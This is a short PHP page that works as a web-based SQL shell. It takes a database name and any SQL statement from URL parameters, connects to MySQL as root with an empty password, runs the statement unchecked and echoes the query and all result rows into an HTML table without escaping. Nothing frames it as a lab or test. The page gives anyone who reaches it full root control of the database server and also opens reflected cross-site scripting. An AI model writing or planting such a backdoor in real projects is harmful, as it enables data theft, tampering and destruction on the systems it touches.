<html>
<body>
<?php  
$db = $_GET['db'];
$link = mysqli_connect('localhost','root','',$db);  
if (!$link) {  
	die('Could not connect to MySQL: ' . mysql_error());  
}  
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
$sql = $_GET['cmd'];
echo 'Query:<br/>';
echo $sql;
echo '<br/>';
try {
	$result = mysqli_query($link, $sql) or die(mysqli_error($link));
} catch (Exception $e) {
	die($e->getMessage());
}
echo 'Result:<br/>';
$all_property = array();
echo '<table border="1"><tr>';
while ($property = mysqli_fetch_field($result)) {
    echo '<td>' . $property->name . '</td>';
    array_push($all_property, $property->name);
}
echo '</tr>';
while ($row = mysqli_fetch_array($result)) {
    echo '<tr>';
    foreach ($all_property as $item) {
        echo '<td>' . $row[$item] . '</td>';
    }
    echo '</tr>';
}
echo '</table>';
mysqli_close($link);  
mysqli_report(MYSQLI_REPORT_OFF);
?>  
</body>
</html>
